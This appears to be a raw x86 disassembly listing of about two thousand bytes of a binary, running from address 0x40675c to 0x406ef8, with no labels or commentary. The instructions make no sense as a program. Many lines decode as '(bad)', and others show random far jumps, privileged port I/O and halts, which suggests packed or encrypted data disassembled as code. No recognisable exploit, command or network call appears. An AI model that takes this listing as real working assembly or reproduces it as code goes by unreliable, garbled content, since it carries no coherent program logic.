  40675c:	test   DWORD PTR [edx+0x443e16bf],ecx
  406762:	retf   
  406763:	sbb    edi,esp
  406765:	cs pop ss
  406767:	cmp    ebp,ecx
  406769:	sub    eax,0x5549ef9a
  40676e:	sar    DWORD PTR [ecx+edi*1],0xcc
  406772:	arpl   di,bx
  406774:	retf   0x2b35
  406777:	mov    dh,0x2c
  406779:	and    BYTE PTR [ecx+0x6c3b3ade],bh
  40677f:	addr16 aam 0xe2
  406782:	dec    ecx
  406783:	pop    edi
  406784:	fisttp QWORD PTR [ebx-0x79]
  406787:	push   ecx
  406788:	and    eax,0x5c73942a
  40678d:	dec    edx
  40678e:	inc    ecx
  40678f:	(bad)  
  406790:	xchg   ebp,eax
  406791:	cmp    edx,DWORD PTR [ebp-0x7dae2769]
  406797:	mov    esi,0x6a6893c9
  40679c:	and    eax,0x516b816
  4067a1:	mov    ebp,0xcb8dd994
  4067a6:	xor    eax,0x1d2dccc8
  4067ab:	(bad)  
  4067ac:	call   0x7d4257df
  4067b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067b2:	js     0x406741
  4067b4:	js     0x40674f
  4067b6:	inc    ebp
  4067b7:	adc    BYTE PTR [ebp+0x52],dl
  4067ba:	lea    edx,[edx-0xc4f5ec2]
  4067c0:	popa   
  4067c1:	cs xchg ebp,eax
  4067c3:	test   al,0x3d
  4067c5:	xor    eax,0x3b5bb992
  4067ca:	jbe    0x406752
  4067cc:	cmp    DWORD PTR [esi-0x249aa4d],esi
  4067d2:	dec    esp
  4067d3:	pop    ebp
  4067d4:	push   cs
  4067d5:	xor    dh,0x36
  4067d8:	jo     0x40681b
  4067da:	xor    al,0x46
  4067dc:	std    
  4067dd:	adc    BYTE PTR [ebx-0x419d04ca],ah
  4067e3:	mov    ch,0x7
  4067e5:	fdivr  st(7),st
  4067e7:	add    eax,0x9f9a7ad1
  4067ec:	jo     0x4067cc
  4067ee:	xor    BYTE PTR [ebx+eiz*2+0xea86886],ch
  4067f5:	in     al,0x96
  4067f7:	xchg   esi,eax
  4067f8:	ret    0x15f4
  4067fb:	cmp    ah,0x38
  4067fe:	mov    esp,DWORD PTR [ecx+0x62]
  406801:	mov    esp,0x91ad3d1c
  406806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406807:	pop    ss
  406808:	js     0x4067a9
  40680a:	sub    BYTE PTR [esi-0x79],0xf7
  40680e:	fwait
  40680f:	pusha  
  406810:	(bad)  
  406811:	mov    WORD PTR ss:[esi-0x58],?
  406815:	in     eax,dx
  406816:	hlt    
  406817:	push   ebx
  406818:	jle    0x4067c1
  40681a:	pop    ebp
  40681b:	mov    ecx,0x6e0e38c0
  406820:	nop
  406821:	retf   0xec42
  406824:	scas   eax,DWORD PTR es:[edi]
  406825:	loop   0x4067fb
  406827:	outs   dx,BYTE PTR ds:[esi]
  406828:	jbe    0x4068a8
  40682a:	mov    esi,0x7b9a3377
  40682f:	mov    edi,0xb816ec45
  406834:	mov    ecx,0x4e1a3802
  406839:	dec    esp
  40683a:	pop    es
  40683b:	outs   dx,DWORD PTR ds:[esi]
  40683c:	out    0xff,al
  40683e:	test   DWORD PTR [edx+0x4ca3c34b],esp
  406844:	cli    
  406845:	ds fprem 
  406848:	fimul  DWORD PTR [ebp+eax*8-0x6]
  40684c:	in     eax,dx
  40684d:	push   edi
  40684e:	rcl    DWORD PTR [edx+ebp*4-0x679af905],cl
  406855:	arpl   WORD PTR [edi],si
  406857:	xchg   ch,bl
  406859:	jb     0x4067dc
  40685b:	cmc    
  40685c:	in     al,0xc6
  40685e:	loope  0x406830
  406860:	int    0x7c
  406862:	jmp    0x4068a8
  406864:	jg     0x4068dd
  406866:	dec    eax
  406867:	pop    esp
  406868:	dec    esp
  406869:	cmp    dl,BYTE PTR [ebp+0x1c]
  40686c:	lahf   
  40686d:	push   ecx
  40686e:	dec    ecx
  40686f:	xrelease xchg BYTE PTR [edx+0x7a],ch
  406873:	out    0x8f,eax
  406875:	or     eax,0x883c60ff
  40687a:	lods   eax,DWORD PTR ds:[esi]
  40687b:	sbb    DWORD PTR [edi+eiz*1],eax
  40687e:	es cmc 
  406880:	sbb    al,0x3b
  406882:	xchg   ebx,eax
  406883:	pusha  
  406884:	mov    cl,0xe7
  406886:	mov    ?,WORD PTR [edx-0x78]
  406889:	jo     0x406820
  40688b:	retf   
  40688c:	cmp    al,0xc
  40688e:	or     BYTE PTR [eax+edx*4-0x6c],bl
  406892:	mov    esp,0x9502447
  406897:	lods   eax,DWORD PTR ds:[esi]
  406898:	jp     0x4068d4
  40689a:	and    bl,dh
  40689c:	inc    esi
  40689d:	mov    ds:0x5b4407e9,al
  4068a2:	rol    DWORD PTR [esi-0x69],1
  4068a5:	mov    al,0xf0
  4068a7:	xchg   ecx,eax
  4068a8:	jmp    0x4068cd
  4068aa:	scas   eax,DWORD PTR es:[edi]
  4068ab:	sbb    eax,0xef8a3a7b
  4068b0:	lea    edx,[edx+eiz*1]
  4068b3:	mov    ebx,0xce055d34
  4068b8:	jne    0x40688e
  4068ba:	or     BYTE PTR [ebx+0x691f599b],0xb4
  4068c1:	and    edx,DWORD PTR [edx+0x6c]
  4068c4:	inc    ebx
  4068c5:	xchg   ch,dh
  4068c7:	adc    ebx,ebx
  4068c9:	dec    BYTE PTR [eax-0xf]
  4068cc:	pop    eax
  4068cd:	call   DWORD PTR [ebx+0x1f855104]
  4068d3:	fdiv   st(5),st
  4068d5:	mov    eax,ds:0x997744af
  4068da:	cdq    
  4068db:	ins    BYTE PTR es:[edi],dx
  4068dc:	push   0x6384310a
  4068e1:	xor    ecx,DWORD PTR [edx+0x53]
  4068e4:	ss jbe 0x4068c9
  4068e7:	push   es
  4068e8:	mov    WORD PTR [ebp+0x63],?
  4068eb:	mov    ebx,DWORD PTR [edx+0x2cdbedac]
  4068f1:	adc    dh,BYTE PTR [esp+ebp*8]
  4068f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068f5:	pop    eax
  4068f6:	repz clc 
  4068f8:	dec    ebp
  4068f9:	jno    0x4068ca
  4068fb:	fs std 
  4068fd:	xchg   esp,eax
  4068fe:	dec    ecx
  4068ff:	scas   eax,DWORD PTR es:[edi]
  406900:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406901:	sub    al,0x8f
  406903:	(bad)  
  406904:	xchg   edx,eax
  406905:	iret   
  406906:	push   ecx
  406907:	push   0x49066187
  40690c:	push   es
  40690d:	mov    cl,0xae
  40690f:	movaps xmm1,xmm7
  406912:	dec    edi
  406913:	scas   al,BYTE PTR es:[edi]
  406914:	imul   eax,ebp,0x8e3b3d1e
  40691a:	repnz dec ecx
  40691c:	push   edi
  40691d:	xchg   cl,ah
  40691f:	into   
  406920:	ins    BYTE PTR es:[edi],dx
  406921:	inc    ebx
  406922:	fwait
  406923:	lock or ebp,ecx
  406926:	jmp    0xdbf0:0x49eb
  40692c:	or     BYTE PTR ds:0x84dcaee1,0x7f
  406933:	adc    eax,0x83c6e493
  406938:	ins    DWORD PTR es:[edi],dx
  406939:	leave  
  40693a:	dec    eax
  40693b:	xchg   ebx,eax
  40693c:	or     ch,BYTE PTR [edi+0x5d944437]
  406942:	pop    ebp
  406943:	frstor [eax]
  406945:	push   0xb70d04ec
  40694a:	jnp    0x4069c4
  40694c:	gs (bad) 
  40694e:	push   ecx
  40694f:	and    eax,0x14e01a81
  406954:	jmp    0x406989
  406956:	ja     0x4069cc
  406958:	adc    BYTE PTR [ebp+0x65a15d13],ch
  40695e:	xchg   edx,eax
  40695f:	dec    esi
  406960:	in     eax,dx
  406961:	(bad)  
  406962:	mov    esp,0x75a4db76
  406967:	add    al,0x14
  406969:	pop    eax
  40696a:	test   al,0xa5
  40696c:	dec    esi
  40696d:	cmc    
  40696e:	ds pop ebx
  406970:	dec    esi
  406971:	leave  
  406972:	clc    
  406973:	jnp    0x406977
  406975:	pop    ecx
  406976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406977:	push   0x7f
  406979:	sub    BYTE PTR [ebx-0x68d75f04],dh
  40697f:	pop    esp
  406980:	xchg   DWORD PTR [eax+0x51],eax
  406983:	mov    edi,0x9773ea08
  406988:	dec    esi
  406989:	ror    BYTE PTR [edi-0x70],1
  40698c:	push   ebx
  40698d:	into   
  40698e:	fnstenv [edx+ecx*8]
  406991:	ds xchg esi,eax
  406993:	cs push ebx
  406995:	adc    eax,0x179faa90
  40699a:	add    BYTE PTR [ebp+0x7994d848],bh
  4069a0:	mov    DWORD PTR [edi-0x6eaab7b6],eax
  4069a6:	out    0x83,al
  4069a8:	jp     0x4069a7
  4069aa:	mov    ds:0x27e2d0eb,al
  4069af:	neg    edi
  4069b1:	dec    ebp
  4069b2:	stc    
  4069b3:	and    BYTE PTR [esi+0x22],dh
  4069b6:	retf   0x8245
  4069b9:	lods   al,BYTE PTR ds:[esi]
  4069ba:	sub    al,BYTE PTR [edx-0x6e5d92d4]
  4069c0:	imul   ebp,DWORD PTR [ebp-0x48],0xffffffcc
  4069c4:	fdivr  QWORD PTR [edx+0x276641f4]
  4069ca:	pushf  
  4069cb:	mov    ebp,0x500b025a
  4069d0:	fisttp DWORD PTR [ecx-0x30]
  4069d3:	mov    ch,0xc3
  4069d5:	sti    
  4069d6:	push   ebp
  4069d7:	addr16 cdq 
  4069d9:	icebp  
  4069da:	mov    ds:0x2bd439e9,al
  4069df:	pop    ebp
  4069e0:	inc    edi
  4069e1:	and    DWORD PTR [ebx+0x62],edi
  4069e4:	mov    ds:0xb2f76dca,eax
  4069e9:	imul   ebp,ebp,0xd43a3ec9
  4069ef:	mov    DWORD PTR [edx+0x66000f33],edx
  4069f5:	fst    QWORD PTR [ecx+0x3]
  4069f8:	or     eax,0x92df7614
  4069fd:	and    bl,BYTE PTR [ebx+0x6f40196a]
  406a03:	scas   al,BYTE PTR es:[edi]
  406a04:	les    esi,FWORD PTR [ecx+0x4555fcb6]
  406a0a:	mov    bl,BYTE PTR [edi]
  406a0c:	fld    TBYTE PTR [edx]
  406a0e:	and    al,0x9d
  406a10:	or     esi,ecx
  406a12:	xchg   dl,dh
  406a14:	inc    ebp
  406a15:	mov    cs:0xebeb3b80,eax
  406a1b:	aaa    
  406a1c:	dec    esp
  406a1d:	or     DWORD PTR ds:0x14a6ab17,esi
  406a23:	or     ch,cl
  406a25:	enter  0x57c5,0xa3
  406a29:	xchg   esp,eax
  406a2a:	test   eax,0x5309f743
  406a2f:	push   ebx
  406a30:	fsub   DWORD PTR [edi-0x67f2a168]
  406a36:	shl    BYTE PTR [edx+ebp*4],1
  406a39:	pusha  
  406a3a:	int    0xda
  406a3c:	dec    esp
  406a3d:	jp     0x406a6e
  406a3f:	aad    0x15
  406a41:	mov    ecx,0x36e4db5a
  406a46:	adc    BYTE PTR [esi-0x54bc6c79],bl
  406a4c:	mov    eax,0xfaadaa56
  406a51:	add    cl,cl
  406a53:	mov    edx,0xa15c87c7
  406a58:	sti    
  406a59:	ins    BYTE PTR es:[edi],dx
  406a5a:	call   0xe439ecd3
  406a5f:	cmp    al,0xd
  406a61:	shl    BYTE PTR [ebp+0x2b],1
  406a64:	hlt    
  406a65:	int3   
  406a66:	fstp   st(1)
  406a68:	sbb    DWORD PTR [eax-0x5b],ebx
  406a6b:	xor    eax,0x93efc6ae
  406a70:	pop    edx
  406a71:	lds    esi,FWORD PTR [edx+0x62]
  406a74:	scas   al,BYTE PTR es:[edi]
  406a75:	mov    bl,0xd1
  406a77:	sub    bh,BYTE PTR [edx+edx*4+0x176f008e]
  406a7e:	jecxz  0x406afb
  406a80:	jo     0x406aec
  406a82:	push   ds
  406a83:	xor    eax,0x7d877856
  406a88:	out    dx,al
  406a89:	sub    DWORD PTR [ecx-0x4f],edi
  406a8c:	cmp    bl,ch
  406a8e:	jb     0x406ac1
  406a90:	mov    edx,0x10f0fe75
  406a95:	push   ebp
  406a96:	clc    
  406a97:	mov    ecx,edi
  406a99:	push   edi
  406a9a:	add    cl,BYTE PTR [ebx+0x7]
  406a9d:	call   0xab2ff36b
  406aa2:	das    
  406aa3:	leave  
  406aa4:	into   
  406aa5:	jmp    0x62e7:0x88a295e8
  406aac:	andnps xmm1,XMMWORD PTR [ecx]
  406aaf:	cmc    
  406ab0:	fmul   st,st(2)
  406ab2:	jne    0x406a9a
  406ab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ab5:	dec    esp
  406ab6:	pop    ss
  406ab7:	pop    ecx
  406ab8:	addr16 dec edx
  406aba:	push   ss
  406abb:	xor    al,0x87
  406abd:	ja     0x406b0d
  406abf:	ret    
  406ac0:	inc    ecx
  406ac1:	(bad)  
  406ac2:	or     DWORD PTR [edx+0x16c85242],eax
  406ac8:	pop    edx
  406ac9:	push   cs
  406aca:	sti    
  406acb:	xor    eax,esp
  406acd:	push   es
  406ace:	xor    dl,BYTE PTR [ecx-0x2d1178e1]
  406ad4:	cmp    BYTE PTR [ebp-0x47],ch
  406ad7:	gs pop ds
  406ad9:	into   
  406ada:	and    DWORD PTR [edi+edi*2],0xffffff8d
  406ade:	add    DWORD PTR [ecx-0x35],edx
  406ae1:	cli    
  406ae2:	sbb    bl,ah
  406ae4:	in     al,dx
  406ae5:	(bad)  
  406ae6:	outs   dx,BYTE PTR ds:[esi]
  406ae7:	fisttp DWORD PTR [edx+0x1c61d379]
  406aed:	jmp    0xc08b765b
  406af2:	xlat   BYTE PTR ds:[ebx]
  406af3:	xchg   ebx,eax
  406af4:	lods   al,BYTE PTR ds:[esi]
  406af5:	add    eax,ecx
  406af7:	sbb    eax,DWORD PTR [esi]
  406af9:	jb     0x406a8a
  406afb:	stc    
  406afc:	adc    esi,ebx
  406afe:	arpl   WORD PTR [edx+0x6b5b71aa],cx
  406b04:	sbb    BYTE PTR [eax],bl
  406b06:	fmul   DWORD PTR [esi+0x267ea9c0]
  406b0c:	xor    bh,BYTE PTR [esi-0x78]
  406b0f:	stos   BYTE PTR es:[edi],al
  406b10:	inc    ecx
  406b11:	imul   esi,DWORD PTR [esi],0x6e96ba94
  406b17:	pop    edi
  406b18:	inc    edx
  406b19:	jnp    0x406b87
  406b1b:	(bad)  
  406b1d:	inc    edx
  406b1e:	push   ss
  406b1f:	call   0x5025:0x75776025
  406b26:	mov    cl,0xc1
  406b28:	pop    ds
  406b29:	adc    al,0xa1
  406b2b:	sti    
  406b2c:	cwde   
  406b2d:	xor    edi,ebx
  406b2f:	and    al,0xac
  406b31:	ret    
  406b32:	pop    DWORD PTR [edi-0x56]
  406b35:	ins    BYTE PTR es:[edi],dx
  406b36:	bound  edi,QWORD PTR [eax+0x37]
  406b39:	jmp    0x406b04
  406b3b:	inc    esp
  406b3c:	ja     0x406ba8
  406b3e:	icebp  
  406b3f:	sub    ah,BYTE PTR [esi+0x3de4996]
  406b45:	(bad)  
  406b46:	in     al,dx
  406b47:	and    BYTE PTR [ebp-0x58],bl
  406b4a:	mov    ecx,0xb476d574
  406b4f:	push   ebp
  406b50:	push   edx
  406b51:	push   es
  406b52:	inc    esp
  406b53:	add    edx,DWORD PTR [ecx-0x42388943]
  406b59:	and    eax,0xa62495cf
  406b5e:	loop   0x406ae2
  406b60:	dec    eax
  406b61:	pushf  
  406b62:	outs   dx,BYTE PTR ds:[esi]
  406b63:	pop    ss
  406b64:	sub    eax,0xfe3954e5
  406b69:	xor    DWORD PTR [ebp-0x23],ecx
  406b6c:	inc    ebp
  406b6d:	pop    ss
  406b6e:	push   eax
  406b6f:	cmp    al,0xf0
  406b71:	int3   
  406b72:	xchg   ebp,eax
  406b73:	fcmovne st,st(2)
  406b75:	xadd   BYTE PTR [eax],al
  406b78:	xlat   BYTE PTR ds:[ebx]
  406b79:	retf   0xfa19
  406b7c:	xor    dh,BYTE PTR [ebx]
  406b7e:	dec    edi
  406b7f:	add    BYTE PTR [edi],cl
  406b81:	loope  0x406b8f
  406b83:	int    0x26
  406b85:	pop    edx
  406b86:	int3   
  406b87:	add    ah,dl
  406b89:	mov    ch,0x23
  406b8b:	imul   esp,DWORD PTR [eax+esi*8],0xffffffff
  406b8f:	pinsrw mm5,WORD PTR [edx],0x23
  406b93:	scas   eax,DWORD PTR es:[edi]
  406b94:	push   eax
  406b95:	cmp    BYTE PTR [edx+0x644bb7],cl
  406b9b:	pop    edi
  406b9c:	sbb    DWORD PTR [ecx-0x106772f8],esi
  406ba2:	jne    0x406beb
  406ba4:	popf   
  406ba5:	pop    esi
  406ba6:	(bad)  
  406ba7:	jge    0x406bc9
  406ba9:	(bad)  
  406bab:	(bad)  [eax]
  406bad:	pop    ss
  406bae:	mov    eax,ds:0xf2547b7d
  406bb3:	fs sub al,0x3e
  406bb6:	fnsave [edi+eax*8+0x44]
  406bba:	mov    ebx,0xca492277
  406bbf:	sar    BYTE PTR [ecx],0xd3
  406bc2:	and    edi,DWORD PTR [esp+ebx*8]
  406bc5:	pop    ebx
  406bc6:	(bad)  
  406bc7:	sbb    BYTE PTR [eax],al
  406bc9:	sbb    eax,0x4e95cd2d
  406bce:	xor    eax,0x980cd308
  406bd3:	add    DWORD PTR [ebx],ebx
  406bd5:	movq   mm2,mm3
  406bd8:	dec    esi
  406bd9:	cmp    ebp,DWORD PTR [esi+0x646b034e]
  406bdf:	dec    eax
  406be0:	pop    edi
  406be1:	add    BYTE PTR [ecx+0x40a90420],ch
  406be7:	test   al,0xba
  406be9:	lods   al,BYTE PTR ds:[esi]
  406bea:	stos   BYTE PTR es:[edi],al
  406beb:	in     al,0x2b
  406bed:	dec    esp
  406bee:	popa   
  406bef:	dec    ecx
  406bf0:	add    al,0x5c
  406bf2:	xchg   esi,eax
  406bf3:	jle    0x406b7b
  406bf5:	in     eax,0x9b
  406bf7:	lods   eax,DWORD PTR ds:[esi]
  406bf8:	(bad)  
  406bf9:	outs   dx,BYTE PTR ds:[esi]
  406bfa:	pop    edi
  406bfb:	div    BYTE PTR [edx]
  406bfd:	popf   
  406bfe:	mov    al,BYTE PTR [eax+edi*2-0xb]
  406c02:	sub    ah,bl
  406c04:	loop   0x406c5d
  406c06:	daa    
  406c07:	inc    ebp
  406c08:	sub    bl,al
  406c0a:	xchg   edi,eax
  406c0b:	mov    ah,0xbb
  406c0d:	out    dx,eax
  406c0e:	loopne 0x406c50
  406c10:	sub    eax,0xfd378492
  406c15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c16:	or     al,BYTE PTR [edi-0x62918a6f]
  406c1c:	sbb    eax,0xfff6af62
  406c21:	in     eax,0x9d
  406c23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c24:	ss pop edx
  406c26:	inc    eax
  406c27:	mov    dl,BYTE PTR ds:0x744a7b6d
  406c2d:	in     al,0xe2
  406c2f:	mov    ch,0xae
  406c31:	mov    ch,0x7c
  406c33:	pop    ss
  406c34:	imul   ebx,DWORD PTR [ebp-0x13623b94],0x3fb243e
  406c3e:	sbb    cl,cl
  406c40:	xchg   esi,eax
  406c41:	fxch   st(1)
  406c43:	scas   eax,DWORD PTR es:[edi]
  406c44:	mov    eax,0xbaa190f4
  406c49:	add    BYTE PTR [edx-0x54b0595],bh
  406c4f:	inc    edi
  406c50:	xor    al,BYTE PTR [ebx-0x55]
  406c53:	add    BYTE PTR [ebx-0x28f34ffa],ch
  406c59:	xor    ebp,edx
  406c5b:	mov    eax,0x444ff1d3
  406c60:	xor    ah,ch
  406c62:	(bad)  
  406c63:	xchg   esp,eax
  406c64:	mov    edx,esp
  406c66:	out    dx,al
  406c67:	mov    esi,0xda400d44
  406c6c:	push   ebx
  406c6d:	cmp    dh,ch
  406c6f:	sub    DWORD PTR [ebx-0x48ac5582],ebx
  406c75:	mov    dl,0xb2
  406c77:	sti    
  406c78:	inc    ebp
  406c79:	mov    edi,0xc769c1a7
  406c7e:	push   bx
  406c80:	sbb    eax,0xaa785245
  406c85:	enter  0x4de,0x2c
  406c89:	retf   0xc7d4
  406c8c:	aad    0x97
  406c8e:	add    DWORD PTR [ebx-0x2f],ebx
  406c91:	xchg   ebp,eax
  406c92:	outs   dx,DWORD PTR ds:[esi]
  406c93:	add    ch,BYTE PTR [ebx+0x53]
  406c96:	enter  0x1143,0xa
  406c9a:	(bad)  
  406c9b:	pop    esi
  406c9c:	loopne 0x406ccc
  406c9e:	sub    BYTE PTR [eax+0x1f],bl
  406ca1:	xchg   esp,eax
  406ca2:	jmp    0x406c8c
  406ca4:	jmp    0xf1f5:0x82b45fd7
  406cab:	push   ecx
  406cac:	jmp    0x406c88
  406cae:	pop    eax
  406caf:	stc    
  406cb0:	mov    eax,ds:0x42a8c7dd
  406cb5:	cmp    BYTE PTR [edi+0x10],bh
  406cb8:	xor    eax,DWORD PTR [ebx]
  406cba:	loopne 0x406cb7
  406cbc:	mov    ds:0x528d049d,al
  406cc1:	inc    ebx
  406cc2:	cwde   
  406cc3:	dec    edx
  406cc4:	push   esi
  406cc5:	xor    al,0x90
  406cc7:	pop    ecx
  406cc8:	mov    cl,0x69
  406cca:	lahf   
  406ccb:	mov    BYTE PTR [ebp-0x24],0x33
  406ccf:	repz repz jno 0x406c5b
  406cd3:	add    DWORD PTR [edi],ebp
  406cd5:	sbb    al,0x5c
  406cd7:	(bad)  
  406cd8:	mov    ah,0x5c
  406cda:	sahf   
  406cdb:	jo     0x406d30
  406cdd:	ret    
  406cde:	les    esi,FWORD PTR [ebx]
  406ce0:	pop    eax
  406ce1:	xchg   edi,eax
  406ce2:	cmp    BYTE PTR [ebx+0x1679eace],ch
  406ce8:	popf   
  406ce9:	cdq    
  406cea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ceb:	arpl   WORD PTR [esi-0x255a8936],di
  406cf1:	or     edx,DWORD PTR [esi]
  406cf3:	mov    ?,WORD PTR [esi+ebp*1+0x37b72d63]
  406cfa:	xor    ah,BYTE PTR [edx+0x32]
  406cfd:	xchg   ebp,eax
  406cfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cff:	lea    bp,[ecx-0x18c8a6d7]
  406d06:	outs   dx,DWORD PTR ds:[esi]
  406d07:	ret    
  406d08:	test   al,0xe
  406d0a:	inc    ecx
  406d0b:	xchg   DWORD PTR ds:0x613f6ca5,esi
  406d11:	xor    BYTE PTR [ebp+ecx*4+0x13],ah
  406d15:	xor    ebx,ecx
  406d17:	(bad)  
  406d18:	aas    
  406d19:	stos   DWORD PTR es:[edi],eax
  406d1a:	cwde   
  406d1b:	dec    eax
  406d1c:	inc    edx
  406d1d:	and    DWORD PTR [ecx-0x471bd193],esp
  406d23:	ja     0x406d8c
  406d25:	push   ebx
  406d26:	mov    esp,DWORD PTR [edi+0x37]
  406d29:	popf   
  406d2a:	cmp    dh,BYTE PTR [edx-0x34de69b8]
  406d30:	fcomp  st(4)
  406d32:	dec    ebx
  406d33:	fsubp  st(7),st
  406d35:	jge    0x406cd4
  406d37:	cs xor eax,0x234938d0
  406d3d:	loope  0x406ced
  406d3f:	cmp    DWORD PTR [esp+ebx*4-0x50],ebx
  406d43:	imul   esi,DWORD PTR [ecx+eax*2+0x5822b4f2],0xffffffe7
  406d4b:	jns    0x406cde
  406d4d:	in     eax,dx
  406d4e:	les    esp,FWORD PTR [ebx+0x17]
  406d51:	out    dx,eax
  406d52:	jge    0x406d59
  406d54:	stc    
  406d55:	xor    al,0xdd
  406d57:	jmp    0x70334931
  406d5c:	ds jmp 0xfce5f856
  406d62:	xchg   ebp,eax
  406d63:	scas   al,BYTE PTR es:[edi]
  406d64:	sbb    BYTE PTR [ebx],ah
  406d66:	inc    ecx
  406d67:	push   0xa3f4abf2
  406d6c:	mov    ecx,0x5289f6d
  406d71:	jge    0x406de4
  406d73:	out    dx,al
  406d74:	dec    ecx
  406d75:	ficom  WORD PTR [ecx]
  406d77:	test   eax,0x40b2875d
  406d7c:	add    esi,esi
  406d7e:	(bad)  
  406d7f:	rcl    DWORD PTR [ebx],1
  406d81:	inc    eax
  406d82:	lods   eax,DWORD PTR ds:[esi]
  406d83:	hlt    
  406d84:	mov    ecx,0xd8bd5ed7
  406d89:	fst    DWORD PTR ds:0x4e63dd6
  406d8f:	adc    al,0x8
  406d91:	es (bad) 
  406d93:	mov    edi,0x83327a34
  406d98:	pop    edx
  406d99:	es push edi
  406d9b:	popa   
  406d9c:	rcl    edx,0xd8
  406d9f:	cdq    
  406da0:	xchg   edi,eax
  406da1:	mov    esi,DWORD PTR [edi]
  406da3:	mov    ebp,edx
  406da5:	and    BYTE PTR [edi],dh
  406da7:	rcl    esi,cl
  406da9:	push   edx
  406daa:	jnp    0x406e09
  406dac:	pop    ecx
  406dad:	nop
  406dae:	call   0xcc7c:0x8d547435
  406db5:	dec    edi
  406db6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406db7:	aas    
  406db8:	mov    dl,0x9
  406dba:	xor    esp,DWORD PTR [ecx+0x566df1cc]
  406dc0:	mov    ds:0x5101da9,al
  406dc5:	in     eax,dx
  406dc6:	adc    eax,ebx
  406dc8:	ins    DWORD PTR es:[edi],dx
  406dc9:	dec    eax
  406dca:	and    eax,0x5620b9a4
  406dcf:	pop    ebp
  406dd0:	daa    
  406dd1:	repnz mov ah,0x79
  406dd4:	fwait
  406dd5:	pop    edi
  406dd6:	std    
  406dd7:	xchg   bl,dh
  406dd9:	(bad)  
  406dda:	(bad)  
  406ddb:	adc    BYTE PTR [ebx+0x5bcf9da0],ah
  406de1:	imul   BYTE PTR [edx]
  406de3:	fimul  WORD PTR [bp+di-0x1d7a]
  406de8:	jno    0x406e47
  406dea:	cmc    
  406deb:	xor    BYTE PTR [eax],ah
  406ded:	push   edx
  406dee:	jne    0x406e19
  406df0:	xor    DWORD PTR [esp+edx*8-0x1c08fcdf],ebp
  406df7:	mov    ch,0x39
  406df9:	in     eax,dx
  406dfa:	repz pop ebp
  406dfc:	cld    
  406dfd:	mov    ah,0xc2
  406dff:	stos   BYTE PTR es:[edi],al
  406e00:	push   cs
  406e01:	imul   esp,DWORD PTR [edi-0x46f09a0a],0xe
  406e08:	xchg   ecx,eax
  406e09:	jg     0x406e1e
  406e0b:	vmread DWORD PTR [ebp-0x1a],ebx
  406e0f:	outs   dx,BYTE PTR ds:[esi]
  406e10:	das    
  406e11:	inc    ebx
  406e12:	sbb    edi,ebx
  406e14:	sbb    ebx,ecx
  406e16:	imul   ebx,DWORD PTR [eax-0x73],0xa6463b36
  406e1d:	aaa    
  406e1e:	xor    BYTE PTR [ecx-0x52],al
  406e21:	lock mov BYTE PTR [eax+0x18f1529c],bl
  406e28:	xlat   BYTE PTR ds:[ebx]
  406e29:	loope  0x406ea4
  406e2b:	pop    ebx
  406e2c:	mov    WORD PTR [esi+0x46680d7],?
  406e32:	popf   
  406e33:	push   cs
  406e34:	push   ebp
  406e35:	mov    ebp,?
  406e37:	imul   esp,DWORD PTR ds:0x95a871cc,0xc1971278
  406e41:	(bad)  
  406e42:	push   0x71
  406e44:	js     0x406e19
  406e46:	mov    DWORD PTR [ebx+0x4aa05ae8],eax
  406e4c:	jp     0x406e59
  406e4e:	inc    edx
  406e4f:	push   esp
  406e50:	mov    ebx,0x60707dca
  406e55:	cmp    ebp,DWORD PTR [ebp-0xe]
  406e58:	sbb    BYTE PTR [edx+0x49],dh
  406e5b:	jge    0x406e8e
  406e5d:	data16 jae 0x406e95
  406e60:	mov    cl,0x8e
  406e62:	cld    
  406e63:	mov    DWORD PTR ds:0xd1e027ef,ebp
  406e69:	repz pop ecx
  406e6b:	jb     0x406eba
  406e6d:	jmp    0x7fefa62e
  406e72:	leave  
  406e73:	ins    BYTE PTR es:[edi],dx
  406e74:	sti    
  406e75:	mov    eax,edx
  406e77:	pop    ebx
  406e78:	sar    DWORD PTR [ebx-0x43180b63],1
  406e7e:	into   
  406e7f:	aad    0x8
  406e81:	(bad)  
  406e82:	mov    eax,ds:0xfa07a2af
  406e87:	jnp    0x406ec7
  406e89:	fistp  QWORD PTR [ebx+0x2c]
  406e8c:	xor    eax,0xc7a10727
  406e91:	mov    cl,0x57
  406e93:	mov    dl,0x35
  406e95:	adc    BYTE PTR [edi-0x3fca0663],ah
  406e9b:	neg    BYTE PTR cs:[edx]
  406e9e:	fucomip st,st(1)
  406ea0:	or     ebp,ebp
  406ea2:	xor    BYTE PTR es:[edx],bl
  406ea5:	xchg   esi,eax
  406ea6:	loopne 0x406e86
  406ea8:	shl    dl,0x5b
  406eab:	dec    edi
  406eac:	jo     0x406f2c
  406eae:	inc    ebx
  406eaf:	fidiv  DWORD PTR [esi-0x107e8d67]
  406eb5:	dec    edi
  406eb6:	jp     0x406f28
  406eb8:	pop    ds
  406eb9:	mov    ds:0x286e30a5,al
  406ebe:	jp     0x406ea6
  406ec0:	pop    esi
  406ec1:	jg     0x406e6e
  406ec3:	and    ch,cl
  406ec5:	ret    
  406ec6:	je     0x406e8d
  406ec8:	ret    
  406ec9:	inc    ecx
  406eca:	and    DWORD PTR [edi+edi*1-0x49],0x4c
  406ecf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ed0:	mov    bl,0xb3
  406ed2:	and    al,bl
  406ed4:	xchg   ecx,eax
  406ed5:	push   ebp
  406ed6:	outs   dx,BYTE PTR ds:[esi]
  406ed7:	push   ebx
  406ed8:	test   eax,0x4dbb171
  406edd:	pop    ecx
  406ede:	test   eax,0xa96638c4
  406ee3:	mov    bh,ch
  406ee5:	fidiv  DWORD PTR ds:0xbe800f28
  406eeb:	mov    ebp,0xcd5db414
  406ef0:	(bad)  
  406ef1:	repnz popf 
  406ef3:	outs   dx,DWORD PTR ds:[esi]
  406ef4:	nop
  406ef5:	dec    ecx
  406ef6:	push   cs
  406ef7:	int3   
  406ef8:	mov    edi,0x24261752
